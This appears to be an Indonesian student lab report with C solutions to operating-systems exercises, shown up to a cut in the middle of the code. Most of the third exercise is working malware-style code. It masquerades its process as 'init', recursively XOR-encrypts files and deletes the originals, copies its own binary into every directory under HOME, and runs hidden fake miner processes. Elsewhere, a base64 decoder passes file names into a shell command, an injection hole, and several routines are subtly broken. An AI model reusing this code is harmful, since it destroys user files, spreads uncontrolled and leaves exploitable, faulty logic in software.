<table>
  <thead>
    <tr>
      <th>No</th>
      <th>Nama</th>
      <th>NRP</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Zein muhammad hasan</td>
      <td>5027241035</td>
    </tr>
    <tr>
      <td>2</td>
      <td>Afriza Tristan Calendra Rajasa</td>
      <td>5027241104</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Jofanka Al-kautsar Pangestu Abady</td>
      <td>5027241107</td>
    </tr>
  </tbody>
</table>

<nav>
  <ul>
    <li><a href="#soal1">Soal1</a></li>
    <li><a href="#soal2">Soal2</a></li>
    <li><a href="#soal3">Soal3</a></li>
    <li><a href="#soal4">Soal4</a></li>
  </ul>
</nav>


  <h2 id="soal1">Soal1</h2>

Dalam soal ini program diminta untuk membuat 3 fitur, yaitu filter, combine, dan decode.

### a. Download

Dalam soal ini program diminta untuk mendownload secara otomatis ketika membuka file. Untuk kodenya seperti ini
```
void download()
{
    if (!opendir("Clues.zip"))
    {
        pid_t pid_download = fork();
        if (pid_download == 0)
        {
            char *download = "wget -q 'https://drive.usercontent.google.com/download?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download&authuser=0' -O Clues.zip";
            char *argv_download[] = {"sh", "-c", download, NULL};
            execv("/bin/sh", argv_download);
            
            char *unzip = "sudo unzip -q Clues.zip";
            char *argv_unzip[] = {"sh", "-c", unzip, NULL};
            execv("/bin/sh", argv_unzip);

            char *rm = "rm Clues.zip";
            char *argv_rm[] = {"sh", "-c", rm, NULL};
            execv("/bin/sh", argv_rm);
        }
        else if (pid_download > 0) wait(NULL);
        else perror("fork");
    }
    printf("Usage: ./action -m [Filter|Combine|Decode]\n");

}
```
dengan step sebagai berikut.
- Program membuat proses fork(), lalu menjalankan proses di dalamnya.
- Download dilakukan dengan variabel ```*download```.
- Setelah itu, dillakukan unzip dengan variabel ```*unzip``` ke folder ```unzip```.
- Remove file dilakukan setelah unzip dengan variabel ```*rm```.
- Ketiga proses tersebut dilakukan dengan proses ```execv()```.
- fungsi if ```(pid_download == 0)``` dilakukan jika proses child.
- ```else if (pid_download > 0)``` digunakan jika proses parent
- untuk ```else``` akan muncul pesan error.

Untuk outputnya seperti ini

![Image](https://github.com/user-attachments/assets/9ae2886b-322e-4ca4-aa30-e1699c637048)

### b. Filter
Untuk proses ini, isi folder ```"Clues/Clue%c"``` akan di-filter file yang berformat satu huruf dan satu angka ke folder ```Filtered```. 

Sebelum itu, kita perlu check jika nama file mempunyai 5 karakter, dan karakter pertama bernilai huruf atau angka. Untuk kodenya seperti ini (untuk format: ```%c.txt``` dengan ```%c``` sebagai nama file).

```
int check_filter(const char *name) {
    return strlen(name) == 5 && (isalpha(name[0]) || isdigit(name[0]));
}
```

Untuk kodenya seperti ini

```
void filter()
{
    
    mkdir("Filtered", 0755);
    DIR *d;
    struct dirent *dir;
    char path[256];
    
    for (int i = 0; i < 4; i++)
    {
        sprintf(path, "Clues/Clue%c", 'A'+i);
        d = opendir(path);
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;

                // inisialisasi full path dari semua folder Clues
                char full_path[512];
                sprintf(full_path, "%s/%s", path, dir->d_name);

                if (check_filter(dir->d_name)) {
                    // Move yang sudah difilter ke folder /Filtered
                    pid_t pid = fork();
                    if (pid == 0) {
                        char *argv[] = {"mv", full_path, "Filtered/", NULL};
                        execv("/bin/mv", argv);
                        perror("mv failed");
                        exit(EXIT_FAILURE);
                    } else wait(NULL);
                } else {
                    // hapus file yang tidak terfilter
                    pid_t pid = fork();
                    if (pid == 0) {
                        char *argv[] = {"rm", "-f", full_path, NULL};
                        execv("/bin/rm", argv);
                        perror("rm failed");
                        exit(EXIT_FAILURE);
                    } else wait(NULL);
                }
            }
            closedir(d);
        }
    }
}
```

Untuk outputnya seperti ini

![Image](https://github.com/user-attachments/assets/44ab2560-d28c-422a-8c58-e264acd97601)

### c. Combine
Pada fungsi ini, program akan menggabungkan file yang sudah ada di folder ```Filtered``` jadi satu dalam file ```.txt```. Untuk kodenya seperti ini.

```
void combine()
{
    FILE *output = fopen("Combined.txt", "w");


    for (int i = 1; i <= 26; i++)
    {
        // file angka
        char file_angka[256];
        sprintf(file_angka, "Filtered/%d.txt", i);

        FILE *file = fopen(file_angka, "r");
        if (file)
        {
            char c;
            if (fscanf(file, " %c", &c) == 1)
            {
            fprintf(output, "%c", c);
            }
            fclose(file);
        }   
        // file huruf
        char file_huruf[256];
        // check file yang dimaksud kosong atau tidak
        if (i <= 26) 
        {
            sprintf(file_huruf, "Filtered/%c.txt", 'a'+ i - 1);
        }
        else
        {
            file_huruf[0] = '\0';
        }
        fopen(file_huruf, "r");
        if (file)
        {
            char c;
            if (fscanf(file, "%c", &c) == 1)
            {
            fprintf(output, "%c", c);
            }
            fclose(file);
        }  
    }

    fclose(output);
}
```

Untuk prosesnya seperti ini.

- Fungsi akan membuat file berupa ```Combined.txt```
- Setelah itu, for loop digunakan untuk membuka file satu angka dan satu huruf.
- Lalu, setiap isi file tersebut akan di-copy ke dalam file ```Combined.txt```.

Untuk outputnya seperti ini

![Image](https://github.com/user-attachments/assets/cae57435-5af3-4f24-80c4-7bb83be519be)

### d. Decode
Pada fungsi ini, dilakukan decode dengan metode ```R0T13```, yaitu melakukan shifting sebanyak 13 karakter. Sebelum fungsi ```decode()``` dilakuan, dibuatlah fungsi ```ROT13()```. Untuk kodenya seperti ini.

```
void ROT13(char *rot)
{
    for (; *rot; rot++)
    {
        if (isalpha(*rot))
        {
            *rot = (toupper(*rot) <= 'M') ? *rot + 13 : *rot - 13;
        }
    }
}
```

Setelah itu, dibuatlah fungsi ```decode()```. Untuk kodenya seperti ini

```
void decode()
{
    // membuka file Decoding.txt
    FILE *combine = fopen("Combined.txt", "r");
    if (!combine) return;

    // Copy isinya ke rot
    char rot[256];
    fscanf(combine, "%s", rot);
    fclose(combine);

    // Melakukan encoding ROT13
    ROT13(rot);

    // Salin hasil ROT13 ke Decoded.txt
    FILE *output = fopen("Decoded.txt", "w");
    fprintf(output, "%s", rot);
    fclose(output);


}
```

Untuk outputnya seperti ini

![Image](https://github.com/user-attachments/assets/80037c8c-0bd3-4fa6-ab4d-b15510bc7f00)

Langkahnya cukup singkat. Langkahnya:

- Fungsi membuka file ```Combine.txt```.
- Setelah itu, dilakukan ROT13 dan hasilnya dimasukkan ke file ```Decoded.txt```.
  
### e. int main()

Untuk kodenya sebagai berikut.

```
int main(int argc, char *argv[])
{
    if (argc != 3 || strcmp(argv[1], "-m"))
    {
        download();
        return 1;

    }

    if (!strcmp(argv[2], "Filter")) filter();
    else if (!strcmp(argv[2], "Combine")) combine();
    else if (!strcmp(argv[2], "Decode")) decode();
    else 
    {
        printf("%s not found. \n\nUsage: %s -m [Filter|Combine|Decode]\n", argv[2], argv[0]);
    };
}
```

Untuk cara menggunakan kode ini yaitu
- Jika user memasukkan command ```./action```, maka program akan mendowload secara otomatis.

- Jika user memasukkan command ```./action -m Filter``` maka program akan menjalankan fungsi ```filter()```.

- Jika user memasukkan command ```./action -m Combine``` maka program akan menjalankan fungsi ```combine()```.

- Jika user memasukkan command ```./action -m Decode``` maka program akan menjalankan fungsi ```decode()```.

- Jika user salah memasukkan command, program akan muncul 
```
printf("%s not found. \n\nUsage: %s -m [Filter|Combine Decode]\n", argv[2], argv[0]);
```

  <h2 id="soal2">Soal2</h2>

<p>
  Pada soal ini kita diminta untuk membantu perempuan yang nolep yang bernama Kanade Yoisaki. Kita diminta untuk membantu Kanade Yoisaki dan teman temannya untuk membuat prgram dengan bahasa c dengan berbeagai fitur, yaitu: <br>
  a. Download dan unzip sebuah starterkit. <br>
  b. Membuat directory karantina yang dapat mendecrypt nama file menggunakan algoritma base64. <br>
  c. Memindahkan file yang ada pada directory starter kit ke karantina dan sebaliknya. <br>
  d. Menghapus seluruh file yang ada pada directory karantina. <br>
  e. Mematikan program decrypt secara aman berdasarkan PID dri proses tersebut. <br>
  f. Membuat error handling. <br>
  g. mencatat penggunaan program dan log dari setiap penggunaan, lalu menyimpannya ke dalam file bernama activity.log.

  </p>
  <h3>Download dan unzip sebuah starterkit</h3>
  
```c
  void download_and_unzip() {
    printf("Mengunduh file dari Google Drive...\n");

    pid_t pid1 = fork();
    if (pid1 == 0) {
        // proses untuk wget
        char *wget_args[] = {
            "wget", "-O", "starterkit.zip",
            "https://drive.usercontent.google.com/download?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&confirm=t",
            NULL
        };
        execvp(wget_args[0], wget_args);
        perror("execvp wget gagal");
        exit(EXIT_FAILURE);
    } else if (pid1 < 0) {
        perror("fork wget gagal");
        return;
    } else {
        // tunggu wget selesai
        waitpid(pid1, NULL, 0);
    }

    // ngecek dan buat folder starter_kit jika belum ada
    struct stat st = {0};
    if (stat("starter_kit", &st) == -1) {
        mkdir("starter_kit", 0700);
    }

    printf("Mengekstrak starterkit.zip ke folder starter_kit...\n");

    pid_t pid2 = fork();
    if (pid2 == 0) {
        // proses untuk unzip file
        char *unzip_args[] = {
            "unzip", "-q", "starterkit.zip", "-d", "starter_kit",
            NULL
        };
        execvp(unzip_args[0], unzip_args);
        perror("execvp unzip gagal");
        exit(EXIT_FAILURE);
    } else if (pid2 < 0) {
        perror("fork unzip gagal");
        return;
    } else {
        // menunggu unzip selesai
        waitpid(pid2, NULL, 0);
    }

    // menghapus file dari sistem
    remove("starterkit.zip");
    printf("Selesai!\n");
}

// mendefinisikan proses execvp dan fork
void run_process(char *args[]) {
    pid_t pid = fork();
    if (pid == 0) {
        execvp(args[0], args);
        perror("execvp gagal");
        exit(EXIT_FAILURE);
    } else if (pid < 0) {
        perror("fork gagal");
        exit(EXIT_FAILURE);
    } else {
        int status;
        waitpid(pid, &status, 0);
    }
}
```

<p>
Fungsi tersebut untuk mendownload dan unzip file yang sudah di download. Seteleha file berhasil didonwload, file zip akan otomatis terhabus. Fungsi tersebut juga bisa untuk mengekstrak isi file tersebut ke dalam file starter kit. <br>

Output yang akan dihasilkan adalah 

```c
Mengunduh file dari Google Drive...
Mengekstrak starterkit.zip ke folder starter_kit...
Selesai!
```

  <h3>Membuat directory karantina yang dapat mendecrypt nama file menggunakan algoritma base64</h3>

```c
// memeriksa apakah ada string yang valid dalam base64 
int is_base64(const char *str) {
    while (*str) {
        if (!(isalnum(*str) || *str == '+' || *str == '/' || *str == '='))
            return 0;
        str++;
    }
    return 1;
}

// decode base64 ke bentuk asli
char *base64_decode(const char *data) {
    char command[512];
    snprintf(command, sizeof(command), "echo '%s' | base64 -d", data);
    FILE *fp = popen(command, "r");
    if (!fp) return NULL;

    char *decoded = malloc(256);
    if (!decoded) return NULL;

    if (fgets(decoded, 256, fp) == NULL) {
        pclose(fp);
        free(decoded);
        return NULL;
    }
    pclose(fp);

    decoded[strcspn(decoded, "\n")] = 0;
    return decoded;
}

// decrypt file
void daemon_decrypt() {
    struct stat st = {0};
    if (stat("quarantine", &st) == -1) {
        mkdir("quarantine", 0700);
    }

    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) {
        FILE *fp = fopen("daemon.pid", "w");
        if (fp) {
            fprintf(fp, "%d\n", pid);
            fclose(fp);
            write_log("Successfully started decryption process with PID %d.", pid);
        }
        exit(EXIT_SUCCESS);
    }

    umask(0);
    setsid();
    chdir(".");
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);

    while (1) {
        DIR *d = opendir("quarantine");
        if (!d) {
            sleep(5);
            continue;
        }

        struct dirent *dir;
        while ((dir = readdir(d)) != NULL) {
            if (dir->d_type == DT_REG && is_base64(dir->d_name)) {
                char oldname[512], newname[512];
                snprintf(oldname, sizeof(oldname), "quarantine/%s", dir->d_name);
                char *decoded = base64_decode(dir->d_name);
                if (decoded && strlen(decoded) > 0) {
                    snprintf(newname, sizeof(newname), "quarantine/%s", decoded);
                    rename(oldname, newname);
                }
                free(decoded);
            }
        }
        closedir(d);
        sleep(5);
    }
```

<p>
Fungsi dari kode tersebut adalah decode nama file dan menecek apakah ada string yang terdiri dari base64 valid. Fungsi ini juga untuk membuat fie bernama "quarantine". file bernama "daemon.pid" untuk melacak PID daemon.

  <h3>Memindahkan file yang ada pada directory starter kit ke karantina dan sebaliknya</h3>

```c
void move_to_quarantine() {
    struct stat st = {0};
    if (stat("quarantine", &st) == -1) {
        mkdir("quarantine", 0700);
    }

    DIR *d = opendir("starter_kit");
    if (!d) {
        perror("starter_kit tidak ditemukan");
        return;
    }

    struct dirent *dir;
    char src[512], dest[512];
    while ((dir = readdir(d)) != NULL) {
        if (dir->d_type == DT_REG) {
            snprintf(src, sizeof(src), "starter_kit/%s", dir->d_name);
            snprintf(dest, sizeof(dest), "quarantine/%s", dir->d_name);
            if (rename(src, dest) == 0) {
                write_log("%s - Successfully moved to quarantine directory.", dir->d_name);
            }
        }
    }
    closedir(d);
    printf("Semua file dari starter_kit dipindah ke quarantine.\n");
}

// memindahkan file dari quarantine ke starter kit 
void return_files() {
    DIR *d = opendir("quarantine");
    if (!d) {
        perror("quarantine tidak ditemukan");
        return;
    }

    struct dirent *dir;
    char src[512], dest[512];
    while ((dir = readdir(d)) != NULL) {
        if (dir->d_type == DT_REG) {
            snprintf(src, sizeof(src), "quarantine/%s", dir->d_name);
            snprintf(dest, sizeof(dest), "starter_kit/%s", dir->d_name);
            if (rename(src, dest) == 0) {
                write_log("%s - Successfully returned to starter kit directory.", dir->d_name);
            }
        }
    }
    closedir(d);
    printf("Semua file telah dikembalikan ke starter_kit.\n");
}
```

<p>
Fungsi dari kode tersebut adalah untuk memindahkan semua file yang ada di "starter_kit" ke folder "quarantine". Kode tersebut juga berfungsi untuk mengembalikkan semua file yang ada di folder "quarantine" ke folder "starter_kit" kembali. <br>

  Output dari kode tersebut jika berhasil memindahkan file ke "quarantine" adalah

```c
Semua file dari starter_kit dipindah ke quarantine.
```

Output dari kode tersebut jika berhasil mengembalikkan file ke "starter_kit" adalah

```c
Semua file telah dikembalikan ke starter_kit.
```
  

  <h3>Menghapus seluruh file yang ada pada directory karantina</h3>
  
```c
void eradicate_quarantine() {
    DIR *d = opendir("quarantine");
    if (!d) {
        perror("quarantine tidak ditemukan");
        return;
    }

    struct dirent *dir;
    char filepath[512];
    int deleted = 0;

    while ((dir = readdir(d)) != NULL) {
        if (dir->d_type == DT_REG) {
            snprintf(filepath, sizeof(filepath), "quarantine/%s", dir->d_name);
            if (remove(filepath) == 0) {
                deleted++;
                write_log("%s - Successfully deleted.", dir->d_name);
            }
        }
    }
    closedir(d);

    printf("%d file berhasil dihapus dari quarantine.\n", deleted);
}
```

<p>
Fungsi dari kode tersebut adalah menghapus file yang ada di folder "quarantine" menggunakan opendir(). <br>

Output yang dihasilkan ketika gagal menghapus file adalah 

```c
quarantine tidak ditemukan
```

<p>
Output yang dihasilkan jika berhasil menghapus file dari "quarantine" adalah

```c
file berhasil dihapus dari quarantine
```
  
  <h3>Mematikan program decrypt secara aman berdasarkan PID dri proses tersebut</h3>

```c
void shutdown_daemon() {
    FILE *fp = fopen("daemon.pid", "r");
    if (!fp) {
        fprintf(stderr, "Tidak dapat menemukan daemon.pid (mungkin daemon tidak berjalan?)\n");
        return;
    }

    pid_t pid;
    if (fscanf(fp, "%d", &pid) != 1) {
        fprintf(stderr, "Gagal membaca PID dari file.\n");
        fclose(fp);
        return;
    }
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        printf("Proses daemon dengan PID %d berhasil dihentikan.\n", pid);
        write_log("Successfully shut off decryption process with PID %d.", pid);
        remove("daemon.pid");
    } else {
        perror("Gagal menghentikan proses daemon");
    }
}
```

<p>
File ini berisi PID dari proses daemon yang dijalankan sebelumnya. <br>

Ouput yang dihasilkan jika gagal mematikan program adalah

```c
Tidak dapat menemukan daemon.pid (mungkin daemon tidak berjalan?)
```

<p>
Output yang dihasilkan jika berhasil mematikan program adalah

```c
Proses daemon dengan PID ... berhasil dihentikan.
```

  <h3>Membuat error handling</h3>

```c
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("\n\033[1;31m ERROR:\033[0m Anda harus memberikan argumen yang valid.\n");
        printf("Penggunaan: %s [--download | --decrypt | --quarantine | --return | --eradicate | --shutdown]\n\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "--download") == 0) {
        download_and_unzip();
    } else if (strcmp(argv[1], "--decrypt") == 0) {
        printf("Menyalakan daemon decrypt di folder quarantine/...\n");
        daemon_decrypt();
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        printf("Memindahkan file ke quarantine...\n");
        move_to_quarantine();
    } else if (strcmp(argv[1], "--return") == 0) {
        return_files();
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_quarantine();
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_daemon();
    } else {
        printf("\n\033[1;31m ERROR:\033[0m Argumen tidak dikenal: %s\n", argv[1]);
        printf("Silakan gunakan salah satu dari: --download | --decrypt | --quarantine | --return | --eradicate | --shutdown\n\n");
        return 1;
    }

    return 0;
}
```

<p>
Fungsi dari kode tersebut adalah memberikan petunjuk untuk menjalan program yang ada. <br>

  Output yang akan terjadi adalah 

```c
ERROR: Anda harus memberikan argumen yang valid.
Penggunaan: ./starterkit [--download | --decrypt | --quarantine | --return | --eradicate | --shutdown]
```

  <h3>mencatat penggunaan program dan log dari setiap penggunaan, lalu menyimpannya ke dalam file bernama activity.log</h3>

```c
// mencatat program log activity
void write_log(const char *format, ...) {
    FILE *logfile = fopen("activity.log", "a");
    if (!logfile) return;

    // mencatat setiap penggunaan program ke activity.log
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(logfile, "[%02d-%02d-%04d][%02d:%02d:%02d] - ",
            t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
            t->tm_hour, t->tm_min, t->tm_sec);
            
    // menulis log dengan format yang ada
    va_list args;
    va_start(args, format);
    vfprintf(logfile, format, args);
    va_end(args);

    fprintf(logfile, "\n");
    fclose(logfile);
}
```

<p>
Fungsi dari kode tersebut adalah mencatat aktivitas program setiap penggunaan ke dalam file "activity.log". <br>

Contoh dari isi dari activity adalah 

```c
[18-04-2025][22:23:09] - cGFzc3dvcmRfc3RlYWxlci5leGUK - Successfully moved to quarantine directory.
[18-04-2025][22:23:09] - project_plan.docx - Successfully moved to quarantine directory.
[18-04-2025][22:23:09] - dHJvamFuLmV4ZQo= - Successfully moved to quarantine directory.
```

  <h2 id="soal3">Soal3</h2>

  ### a. /init
  Dalam soal ini diminta untuk mengubah nama proses menjadi /init. untuk kode yang digunakan seperti ini. 

  ```
  #include <string.h>
  #include <sys/prctl.h>
  extern char *__progname;

  ...

  int main(int argc, char *argv[]) {

  ...

    strcpy(__progname, "init");
    prctl(PR_SET_NAME, __progname);

  ...
  
  }
  ```

  ### b. Anak Fitur Pertama
  Untuk anak fitur pertama (bernama wannacryptor) diperluan sebuah fungsi. Tetapi, sebelum itu dibuat fungsi tambahan untuk mengecek apakah ia merupakan directory ( ```int is_directory```) dan untuk enskripsi nama file dengan menambahakn format .enc pada akhir file (```is_encrypted```). Untuk kodenya seperti ini

  ```
  int is_directory(const char *path) {
    struct stat statbuf;
    return (stat(path, &statbuf) == 0 && S_ISDIR(statbuf.st_mode));
  }

  int is_encrypted(const char *filename) {
    return strstr(filename, ".enc") != NULL;
  }
  ```

  Setelah itu, fungsi ```wannacryptor()``` dibuat dengan melibatkan 2 fungsi yang dijabarkan sebelumnya. Untuk kodenya seperti ini
  ```
  void encrypt_file(const char *filepath) {
    if (is_encrypted(filepath)) return;

    FILE *fp = fopen(filepath, "rb");
    if (!fp) return;

    char new_filepath[512];
    snprintf(new_filepath, sizeof(new_filepath), "%s.enc", filepath);

    FILE *fp_out = fopen(new_filepath, "wb");
    if (!fp_out) {
        fclose(fp);
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= (unsigned char)(xor_key & 0xFF);
        }
        fwrite(buffer, 1, bytesRead, fp_out);
    }

    fclose(fp);
    fclose(fp_out);
    remove(filepath);
}

void scan_and_encrypt(const char *dirpath) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        if (is_directory(fullpath)) {
            scan_and_encrypt(fullpath);
        } else {
            encrypt_file(fullpath);
        }
    }

    closedir(dir);
}

  ```

  Untuk prosesnya sebagai berikut.
  1) Fungsi ```void encrypt_file(const char *filepath)```
     - Pertama-tama, fungsi mengambil input berupa file path
     - Dicek apakah file tersebut ada, jika tidak ada maka ```return```.
     - Setelah itu dilakukan new_filepath file dengan kode ```snprintf(new_filepath, sizeof(new_filepath), "%s.enc", filepath);```.
     - Lalu, dilakukan enskripsi dengan kode ```buffer[i] ^= (unsigned char)(xor_key & 0xFF);```.
     - Jika enskripsi selesai, dilakukan penulisan file .enc ke ```fwrite(buffer, 1, bytesRead, fp_out);```.
     - Jika proses selesai, ```fp```, ```fp_out``` akan diclose dengan ```fclose()``` dan ```filepath``` akan diremove.
    
  2) Fungsi ```scan_and_encrypt(const char *dirpath)```
     - Pertama-tama, fungsi mengambil input berupa file path
     - Dicek apakah file tersebut ada, jika tidak ada maka ```return```.
     - Lalu dilakukan pengecekan, jika nama file merupakan direktori saat ini dan sebelumnya, maka fungsi akan ```continue```.
     - Setelah itu, dilakukan ```sprintf()``` untuk mendapatkan ```full_path``` agar bisa ke tahap selanjutnya.
     - Dilakukan pengecekan bahwa ```full_path``` merupakan direktori atau bukan. Jika merupakan directory, maka fungsi akan memanggil dirinya sendiri (fungsi rekursif). Sedangkan, jika bukan maka file akan dienskripsi.
  
  Untuk outputnya seperti ini
  
  ![Image](https://github.com/user-attachments/assets/926d70fc-7d46-4131-90e3-c2fe1f7fb0cc)

  ### c. Anak Fitur Kedua
  Anak fitur kedua bernama trojan.wrm. Caranya sama seperti anak fitur pertama, yaitu menggunakan fungsi. Untuk soal ini, diperlukan dua fungsi.
  
  1) Fungsi ```copy_file(const char *source, const char *dest)```
     Untuk kodenya seperti ini
     
      ```
      void copy_file(const char *source, const char *dest) {
          FILE *src = fopen(source, "rb");
          if (!src) return;
      
          FILE *dst = fopen(dest, "wb");
          if (!dst) {
              fclose(src);
              return;
          }
      
          char buffer[BUFFER_SIZE];
          size_t bytes;
          while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
              fwrite(buffer, 1, bytes, dst);
          }
      
          fclose(src);
          fclose(dst);
      }
      ```
    
      Penjelasan:
      - Fungsi akan memanggil variabel pointer berupa source dan fest.
      - Source akan dibuka dengan masing-masing dalamm mode read-back dan write-back.
      - Keduanya dilakukan pengecekan, jiak tidak ada maka ```return```.
      - Setelah itu, dilakukan copy file ke destinasi yang dituju.
      - Lalu, source dan dst di-close.

  2) Fungsi ```spread_binary(const char *current_dir, const char *self_path)```

     Untuk kodenya seperti ini
     ```
      void spread_binary(const char *current_dir, const char *self_path) {
          DIR *dir = opendir(current_dir);
          if (!dir) return;
      
          struct dirent *entry;
          char fullpath[MAX_PATH];
      
          snprintf(fullpath, sizeof(fullpath), "%s/%s", current_dir, FILENAME);
          copy_file(self_path, fullpath);
      
          while ((entry = readdir(dir)) != NULL) {
              if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
      
              snprintf(fullpath, sizeof(fullpath), "%s/%s", current_dir, entry->d_name);
              if (is_directory(fullpath)) {
                  spread_binary(fullpath, self_path);
              }
          }
      
          closedir(dir);
     }
     ```

     Penjelasan:
     - Fungsi akan mengambil data berupa ```current_dir``` dan ```self_path```.
     - Pengecekan dilakukan, jika ```current_dir``` tidak ada maka ```return```.
     - Setelah itu, ```snprintf``` dilakukan untuk mencetak string untuk mendapatkan ```fullpath```.
     - Setelah itu, dilakukan fungsi while, jika nama file merupakan direktori saat ini dan sebelumnya, maka fungsi akan ```continue```.
     - Lalu, dilakuakn ```snprintf``` fullpath untuk mendapatkan data dengan ```current_dir``` dan ```entry->d_name```.
     - Pengecekan dilakukan untuk mengetahui bahwa ```fullpath``` merupakan directory atau bukan. Jika ```fullpath``` merupakan directory, maka fungsi ```spread_binary(fullpath, self_path)``` akan dijalankan.

### d. Looping 30 Detik

Dalam soal diminta banak fitur pertama dan anak fitur kedua untuk berjalan setiap 30 detik. Untuk kodenya seperti ini
```
void wannacryptor_repeat() {
    while (1) {
        char self_path[MAX_PATH];
        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        if (len == -1) exit(EXIT_FAILURE);
        self_path[len] = '\0';
        
        char *home = getenv("HOME");
        if (!home) home = "/";
        
        scan_and_encrypt(TARGET_DIR);
        sleep(30);
    }
}

void trojan_repeat() {
    while (1) {
        char self_path[MAX_PATH];
        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        if (len == -1) exit(EXIT_FAILURE);
        self_path[len] = '\0';
        
        char *home = getenv("HOME");
        if (!home) home = "/";

        spread_binary(home, self_path);
        sleep(30);
    }
}
```
Penjelasan:
- While ```True```, fungsi akan berjalan secara terus menerus.
- Fungsi akan membaca ```self_path```, yaitu membaca path sendiri.
- Setelah itu, ```*home``` akan mengambil data yaitu ```getenv("HOME")```.
- Jika ```home``` tidak ada, maka ```home``` dideklarasikan dengan ```home = "/"```.
- Jika ```home``` ada, maka fungsi menjalankan fungsi tertentu.

### e. Anak Fitur Ketiga (Untuk soal no 3e dan 3f)
Untuk anak fitur ketiga (bernama rodok.exe), diperlukan beberapa fungsi, yaitu:
1) Fungsi ```generate_hash(char *hash)```
   
   Fungsi ini digunakan untuk generate hash secara random. Untuk kode nya seperti ini
   
   ```
   void generate_hash(char *hash) {
      const char hex_chars[] = "0123456789abcdef";
      for (int i = 0; i < HASH_LENGTH; i++) {
          hash[i] = hex_chars[rand() % 16];
      }
      hash[HASH_LENGTH] = '\0';
    }
   ```
   Dimana cara kerjanya yaitu fungsi mengambil input, lalu menggunakan for loop hingga panjang hash (```HASH_LENGTH```).

2) Fungsi ```miner_process(int id)```

   Pada soal diminta untuk membuat hash secara random dalam rentang waktu 3 - 30 detik. Untuk jumlah mine-crafter kita batasi sebanyak 4 mine-crafter. Untuk kode has sebagai berikut.

   ```
   void miner_process(int id) {
     char hash[HASH_LENGTH + 1];
     srand(time(NULL) ^ (getpid()<<16));

     while (1) {
         int wait_time = 3 + rand() % 28;
         sleep(wait_time);
         generate_hash(hash);
         write_log(id, hash);
     }
   }
   ```

   Cara kerjanya:
   - Fungsi akan mengambil data berupa id
   - Setelah itu, fungsi akan random menggunakan ```srand(time(NULL) ^ (getpid()<<16));``` untuk menghindari semua proses punya hasil rand() yang sama.
   - Fungi while True diperlukan agar program jalan secara terus menerus.
   - ```int wait_time = 3 + rand() % 16``` adalah waktu tunggu dengan rentang 3 - 30 detik.
   - Fungsi akan generate hash dengan fungsi ```generate_hash()```.
   - Setelah itu, dilakukan penulisan log dengan fungsi ```write_log()```.
  
### f. ```/tmp/.miner.log```

Mula-mula, kita memerlukan beberapa fungsi.
1) Fungsi ```write_log()```
   Fungsi ini bertujuan untuk membuat file baru di direktori ```/tmp```. Untuk kodenya seperti ini

   ```
   void write_log(int id, const char *hash) {
     FILE *f = fopen("/tmp/.miner.log", "a");
     if (f) {
         time_t now = time(NULL);
         struct tm *t = localtime(&now);
         char timebuf[64];
         strftime(timebuf, sizeof(timebuf), "%F %T", t);
         fprintf(f, "[%s][Miner %d] %s\n", timebuf, id, hash);
         fclose(f);
     }
   }
   ```

  Untuk cara kerjanya seperti ini
  - Fungsi akan membuka file secara append (tidak mengubah data sebelumnya)
  - Mengambil beberapa informasi yang diperlukan, seperti tanggal, waktu, id, dan hash.
  - Setelah itu, ```fprintf``` digunakan untuk mencetak log sesuai kebutuhan.
  - Program di-close menggunakan ```flclose(f)```.

  Untuk outputnya seperti ini

  ![Image](https://github.com/user-attachments/assets/9529b564-5241-4d2a-88cb-247c4e42115d)

### g) ```int main()```

Karena fungsi pertama dan kedua berjalan secara berulang, untuk menjalankan fungsi anak ketiga diperlukan kode sebagai berikut.

```
if (strstr(argv[0], "mine-crafter-") != NULL) {
    int miner_id = atoi(argv[0] + strlen("mine-crafter-"));
    prctl(PR_SET_NAME, argv[0]);
    miner_process(miner_id);
    exit(0);
}
```
Dimana fungsi akan mengganti nama proses menjadi mine-crafer-xx di ps output.

Selanjutnya, pada soal diminta untuk mengubah nama proses menjadi ```init```. Untuk kodenya seperti ini

```
    strcpy(__progname, "init");
    prctl(PR_SET_NAME, __progname);
```
Dimana ```__progname``` merupakan pemanggilan dari ```extern char *__progname;```.

Setelah itu, kita akan menjalankan ```rodok.exe```. Untuk kodenya seperti ini

```
    pid_t pid_rodok = fork();
    if (pid_rodok == 0) {
        strcpy(__progname, "rodok.exe");
        prctl(PR_SET_NAME, __progname);

        // signal(SIGINT, handle_sigint);

        for (int i = 0; i < NUM_MINERS; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                char exe_path[MAX_PATH];
                ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
                if (len == -1) exit(EXIT_FAILURE);
                exe_path[len] = '\0';

                char proc_name[64];
                snprintf(proc_name, sizeof(proc_name), "mine-crafter-%d", i);

                char *new_argv[] = {proc_name, NULL};
                execv(exe_path, new_argv);
                perror("execv failed");
                exit(EXIT_FAILURE);
